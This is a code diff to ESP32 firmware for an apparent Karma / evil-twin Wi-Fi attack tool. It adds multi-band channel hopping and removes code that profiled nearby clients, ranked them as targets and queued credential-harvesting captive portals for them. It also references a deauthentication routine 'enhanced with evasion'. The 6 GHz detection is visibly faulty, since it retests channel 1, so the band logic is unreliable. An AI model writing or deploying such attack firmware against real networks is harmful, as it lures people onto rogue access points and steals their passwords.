@@ -869,9 +869,20 @@ void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
 }
 
 void ActiveBroadcastAttack::rotateChannel() {
+    // Use adaptive channel rotation based on supported bands
+    std::vector<int> channelList = buildKarmaChannelList();
     static size_t channelIndex = 0;
-    channelIndex = (channelIndex + 1) % (sizeof(rotate_channels) / sizeof(rotate_channels[0]));
-    currentChannel = pgm_read_byte(&rotate_channels[channelIndex]);
+    
+    if (!channelList.empty()) {
+        channelIndex = (channelIndex + 1) % channelList.size();
+        currentChannel = channelList[channelIndex];
+        setChannelWithSecond(currentChannel);
+    } else {
+        // Fallback to original rotation
+        static size_t idx = 0;
+        idx = (idx + 1) % (sizeof(rotate_channels) / sizeof(rotate_channels[0]));
+        currentChannel = pgm_read_byte(&rotate_channels[idx]);
+    }
 }
 
 void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel) {
@@ -1506,6 +1517,177 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
 }
 
 // ============================================================
+// Band Detection and Adaptive Channel Management
+// ============================================================
+
+static SupportedBands g_karmaSupportedBands;
+
+void detectSupportedBands() {
+    // Reset
+    g_karmaSupportedBands = SupportedBands();
+    
+    // Check 2.4GHz (channels 1-14)
+    if (esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
+        g_karmaSupportedBands.has2_4GHz = true;
+        g_karmaSupportedBands.bandList.push_back(BAND_2_4GHZ);
+        g_karmaSupportedBands.bandCount++;
+    }
+    
+    // Check 5GHz (channels 36-165)
+    if (esp_wifi_set_channel(36, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
+        g_karmaSupportedBands.has5GHz = true;
+        g_karmaSupportedBands.bandList.push_back(BAND_5GHZ);
+        g_karmaSupportedBands.bandCount++;
+    } else if (esp_wifi_set_channel(149, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
+        g_karmaSupportedBands.has5GHz = true;
+        g_karmaSupportedBands.bandList.push_back(BAND_5GHZ);
+        g_karmaSupportedBands.bandCount++;
+    }
+    
+    // Check 6GHz (channels 1-233)
+    if (esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
+        // Simplified 6GHz detection
+        g_karmaSupportedBands.has6GHz = true;
+        g_karmaSupportedBands.bandList.push_back(BAND_6GHZ);
+        g_karmaSupportedBands.bandCount++;
+    }
+    
+    // Restore to a safe channel
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    
+    Serial.printf("[KARMA] Supported bands: 2.4:%d 5:%d 6:%d Count:%d\n",
+                  g_karmaSupportedBands.has2_4GHz, g_karmaSupportedBands.has5GHz,
+                  g_karmaSupportedBands.has6GHz, g_karmaSupportedBands.bandCount);
+}
+
+bool isBandSupported(int band) {
+    switch (band) {
+        case BAND_2_4GHZ: return g_karmaSupportedBands.has2_4GHz;
+        case BAND_5GHZ: return g_karmaSupportedBands.has5GHz;
+        case BAND_6GHZ: return g_karmaSupportedBands.has6GHz;
+        default: return false;
+    }
+}
+
+SupportedBands getSupportedBands() {
+    return g_karmaSupportedBands;
+}
+
+String getBandName(int band) {
+    switch (band) {
+        case BAND_2_4GHZ: return "2.4GHz";
+        case BAND_5GHZ: return "5GHz";
+        case BAND_6GHZ: return "6GHz";
+        default: return "Unknown";
+    }
+}
+
+std::vector<int> buildKarmaChannelList() {
+    std::vector<int> channels;
+    
+    if (g_karmaSupportedBands.has2_4GHz) {
+        // 2.4GHz channels - prioritize 1, 6, 11
+        channels.push_back(1);
+        channels.push_back(6);
+        channels.push_back(11);
+        // Add the rest
+        for (int ch = 1; ch <= 14; ch++) {
+            if (ch != 1 && ch != 6 && ch != 11) {
+                channels.push_back(ch);
+            }
+        }
+    }
+    
+    if (g_karmaSupportedBands.has5GHz) {
+        // 5GHz channels - common ones
+        int fiveGHzChannels[] = {36, 40, 44, 48, 149, 153, 157, 161};
+        for (int ch : fiveGHzChannels) {
+            channels.push_back(ch);
+        }
+    }
+    
+    if (g_karmaSupportedBands.has6GHz) {
+        // 6GHz channels - representative subset
+        int sixGHzChannels[] = {1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53, 57, 61, 65, 69, 73, 77, 81, 85, 89, 93, 97, 101, 105, 109, 113, 117, 121, 125, 129, 133, 137, 141, 145, 149, 153, 157, 161, 165, 169, 173, 177, 181, 185, 189, 193, 197, 201, 205, 209, 213, 217, 221, 225, 229, 233};
+        for (int ch : sixGHzChannels) {
+            channels.push_back(ch);
+        }
+    }
+    
+    // If no channels found, fallback to 2.4GHz defaults
+    if (channels.empty()) {
+        channels.push_back(1);
+        channels.push_back(6);
+        channels.push_back(11);
+    }
+    
+    return channels;
+}
+
+void karmaAdaptiveHop() {
+    static std::vector<int> channelList;
+    static size_t channelIndex = 0;
+    static bool initialized = false;
+    
+    if (!initialized) {
+        // Detect bands and build channel list
+        detectSupportedBands();
+        channelList = buildKarmaChannelList();
+        initialized = true;
+        
+        // Log the channel list
+        String channelStr = "";
+        for (size_t i = 0; i < channelList.size(); i++) {
+            if (i > 0) channelStr += ", ";
+            channelStr += String(channelList[i]);
+        }
+        Serial.printf("[KARMA] Adaptive hop channels: %s\n", channelStr.c_str());
+    }
+    
+    if (channelList.empty()) {
+        // Fallback to original karma_channels
+        channelList.push_back(1);
+        channelList.push_back(6);
+        channelList.push_back(11);
+    }
+    
+    // Rotate through channels
+    channelIndex = (channelIndex + 1) % channelList.size();
+    uint8_t nextChannel = channelList[channelIndex];
+    
+    // Only change if different
+    if (nextChannel != channl + 1) {
+        channl = nextChannel - 1;
+        setChannelWithSecond(nextChannel);
+        
+        // Update display if needed
+        screenNeedsRedraw = true;
+    }
+}
+
+bool isKarmaChannelValid(uint8_t channel) {
+    // Check if channel is in the supported band list
+    int band = getWiFiBand(channel);
+    return isBandSupported(band);
+}
+
+void setKarmaChannel(uint8_t channel) {
+    if (isKarmaChannelValid(channel)) {
+        channl = channel - 1;
+        setChannelWithSecond(channel);
+        screenNeedsRedraw = true;
+    } else {
+        Serial.printf("[KARMA] Channel %d not supported on this hardware\n", channel);
+        // Fallback to first available channel
+        std::vector<int> channelList = buildKarmaChannelList();
+        if (!channelList.empty()) {
+            channl = channelList[0] - 1;
+            setChannelWithSecond(channelList[0]);
+        }
+    }
+}
+
+// ============================================================
 // Deauth Function - Enhanced with evasion
 // ============================================================
 
@@ -1566,175 +1748,7 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
 }
 
 // ============================================================
-// Client Behavior Analysis
-// ============================================================
-
-void analyzeClientBehavior(const ProbeRequest &probe) {
-    auto it = clientBehaviors.find(probe.fingerprint);
-    
-    String rateKey = String(probe.fingerprint);
-    unsigned long now = millis();
-    if (now - lastRateLimitReset > RATE_LIMIT_WINDOW) {
-        targetRateLimit.clear();
-        lastRateLimitReset = now;
-    }
-    
-    if (targetRateLimit[rateKey] >= karmaConfig.rateLimitPerTarget) {
-        return;
-    }
-    targetRateLimit[rateKey]++;
-
-    if (it == clientBehaviors.end()) {
-        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
-            uint32_t oldestFingerprint = 0;
-            unsigned long oldestTime = UINT32_MAX;
-            for (const auto &pair : clientBehaviors) {
-                if (pair.second.lastSeen < oldestTime) {
-                    oldestTime = pair.second.lastSeen;
-                    oldestFingerprint = pair.first;
-                }
-            }
-            if (oldestFingerprint != 0) { clientBehaviors.erase(oldestFingerprint); }
-        }
-
-        ClientBehavior behavior;
-        behavior.fingerprint = probe.fingerprint;
-        behavior.lastMAC = probe.mac;
-        behavior.firstSeen = probe.timestamp;
-        behavior.lastSeen = probe.timestamp;
-        behavior.probeCount = 1;
-        behavior.avgRSSI = probe.rssi;
-        behavior.probedSSIDs.push_back(probe.ssid);
-        behavior.favoriteChannel = probe.channel;
-        behavior.lastKarmaAttempt = 0;
-        behavior.isVulnerable = (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*"));
-        behavior.successfulInteractions = 0;
-        behavior.failedInteractions = 0;
-        behavior.successRate = 0.0f;
-        behavior.consecutiveFailures = 0;
-        behavior.lastSuccessTime = 0;
-        behavior.isPermanentTarget = false;
-        behavior.priorityScore = 0;
-        clientBehaviors[probe.fingerprint] = behavior;
-        uniqueClients++;
-    } else {
-        ClientBehavior &behavior = it->second;
-        behavior.lastSeen = probe.timestamp;
-        behavior.probeCount++;
-        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;
-        if (probe.channel >= 1 && probe.channel <= 14) {
-            channelActivity[probe.channel - 1]++;
-            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1])
-                behavior.favoriteChannel = probe.channel;
-        }
-        bool ssidExists = false;
-        for (const auto &existingSSID : behavior.probedSSIDs) {
-            if (existingSSID == probe.ssid) {
-                ssidExists = true;
-                break;
-            }
-        }
-        if (!ssidExists && !probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*") &&
-            behavior.probedSSIDs.size() < 10) {
-            behavior.probedSSIDs.push_back(probe.ssid);
-            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
-        }
-        
-        if (behavior.isVulnerable && behavior.probeCount >= PERMANENT_TARGET_THRESHOLD &&
-            behavior.successRate > 70.0f) {
-            behavior.isPermanentTarget = true;
-            handlePermanentTarget(behavior);
-        }
-    }
-}
-
-uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
-    uint8_t score = client.priorityScore;
-    
-    if (probe.rssi > -50) score += 30;
-    else if (probe.rssi > -65) score += 20;
-    else if (probe.rssi > -75) score += 10;
-    
-    if (client.probeCount > 10) score += 25;
-    else if (client.probeCount > 5) score += 15;
-    else if (client.probeCount > 2) score += 5;
-    
-    if (client.isVulnerable) score += 20;
-    if (client.isPermanentTarget) score += 30;
-    
-    unsigned long sinceLast = millis() - client.lastSeen;
-    if (sinceLast < 5000) score += 15;
-    else if (sinceLast < 15000) score += 10;
-    else if (sinceLast < 30000) score += 5;
-    
-    if (client.successRate > 70.0f) score += 25;
-    else if (client.successRate > 50.0f) score += 15;
-    
-    if (client.consecutiveFailures > 3) score -= 20;
-    else if (client.consecutiveFailures > 1) score -= 10;
-    
-    if (probeSSIDEquals(probe, "*WILDCARD*")) score = 0;
-    
-    return std::min(score, (uint8_t)255);
-}
-
-AttackTier determineAttackTier(uint8_t priority) {
-    if (priority >= 200) return TIER_CLONE;
-    if (priority >= 100) return TIER_HIGH;
-    if (priority >= 60) return TIER_MEDIUM;
-    if (priority >= 40) return TIER_FAST;
-    return TIER_NONE;
-}
-
-uint32_t getPortalDuration(AttackTier tier) {
-    switch (tier) {
-        case TIER_CLONE: return attackConfig.cloneDuration;
-        case TIER_HIGH: return attackConfig.highTierDuration;
-        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
-        case TIER_FAST: return attackConfig.fastTierDuration;
-        default: return attackConfig.mediumTierDuration;
-    }
-}
-
-// ============================================================
-// Permanent Target Handling
-// ============================================================
-
-void handlePermanentTarget(ClientBehavior &client) {
-    if (!karmaConfig.enablePermanentTargets) return;
-    if (!client.isPermanentTarget) return;
-    if (client.successRate < 70.0f) return;
-    
-    if (pendingPortals.size() < MAX_PENDING_PORTALS) {
-        PendingPortal portal;
-        portal.ssid = client.probedSSIDs[0];
-        portal.channel = client.favoriteChannel;
-        portal.targetMAC = client.lastMAC;
-        portal.timestamp = millis();
-        portal.launched = false;
-        portal.templateName = selectedTemplate.name;
-        portal.templateFile = selectedTemplate.filename;
-        portal.isDefaultTemplate = selectedTemplate.isDefault;
-        portal.verifyPassword = selectedTemplate.verifyPassword;
-        portal.priority = 255;
-        portal.tier = TIER_HIGH;
-        portal.duration = attackConfig.highTierDuration * 2;
-        portal.isCloneAttack = false;
-        portal.probeCount = client.probeCount;
-        portal.clientFingerprint = client.fingerprint;
-        portal.isHighValueTarget = true;
-        portal.failureCount = 0;
-        portal.lastAttempt = 0;
-        
-        enqueuePendingPortal(portal, true);
-        
-        Serial.printf("[KARMA] High-value permanent target: %s (FP: %lu, Rate: %.1f%%)\n",
-                     portal.ssid.c_str(), (unsigned long)client.fingerprint, client.successRate);
-    }
-}
-
-// ============================================================
-// Channel Management
+// Channel Management (Updated with adaptive hopping)
 // ============================================================
 
 void updateChannelActivity(uint8_t channel) {
@@ -1780,16 +1794,9 @@ void smartChannelHop() {
     unsigned long now = millis();
     if (now - last_ChannelChange < hop_interval) return;
     
-    uint8_t bestChannel = getBestChannel();
-    if (bestChannel != channl + 1) {
-        channl = bestChannel - 1;
-        esp_wifi_set_channel(bestChannel, WIFI_SECOND_CHAN_NONE);
-    } else {
-        currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
-        uint8_t channel = pgm_read_byte(&priorityChannels[currentPriorityChannel]);
-        channl = channel - 1;
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    }
+    // Use adaptive hopping instead of fixed channel list
+    // This will automatically use 2.4GHz, 5GHz, or 6GHz channels based on hardware support
+    karmaAdaptiveHop();
     last_ChannelChange = now;
 }
 
